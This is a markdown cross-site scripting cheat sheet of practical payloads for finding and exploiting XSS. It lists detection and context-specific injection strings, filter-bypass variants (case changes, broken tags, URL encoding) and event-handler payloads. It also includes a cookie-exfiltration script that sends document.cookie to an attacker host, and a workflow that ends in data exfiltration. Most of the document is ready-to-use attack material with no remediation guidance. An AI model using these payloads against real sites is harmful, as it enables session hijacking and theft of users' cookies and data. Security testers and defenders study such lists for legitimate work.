# 🔥 XSS Cheatsheet

> Practical payloads and techniques for identifying and exploiting Cross-Site Scripting (XSS)

---

## 📌 Quick Detection Payloads

```html
<script>alert(1)</script>
"><script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

---

## ⚡ Context-Based Payloads

### HTML Context

```html
<script>alert(1)</script>
```

### Attribute Context

```html
" onmouseover="alert(1)
' onfocus=alert(1) autofocus '
```

### JavaScript Context

```javascript
';alert(1);//
";alert(1);//
```

---

## 🧠 Filter Bypass Techniques

### Case Bypass

```html
<ScRiPt>alert(1)</ScRiPt>
```

### Broken Tags

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### Encoding

```html
%3Cscript%3Ealert(1)%3C/script%3E
```

---

## 🔍 Event Handlers (High Success Rate)

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

---

## 💣 Advanced Payloads

### Cookie Exfiltration

```html
<script>
fetch('https://attacker.com?c='+document.cookie)
</script>
```

---

### DOM XSS Testing

```javascript
# Look for sources
location.search
document.URL
document.referrer

# Look for sinks
innerHTML
document.write
eval()
```

---

## 📍 High-Value Targets

* Search parameters
* Reflected input in response
* JavaScript variables
* DOM manipulation code

---

## 🔎 Testing Workflow

1. Inject basic payload
2. Identify context (HTML / JS / attribute)
3. Adjust payload accordingly
4. Try bypass techniques
5. Escalate to data exfiltration

---

## 🧠 Pro Tips

* Always view **page source + DOM**
* Use browser dev tools (Inspect)
* Test with Burp Suite repeater
* Focus on **reflected inputs first**

---

## ⚠️ Key Insight

XSS success depends on **context**, not just payload.
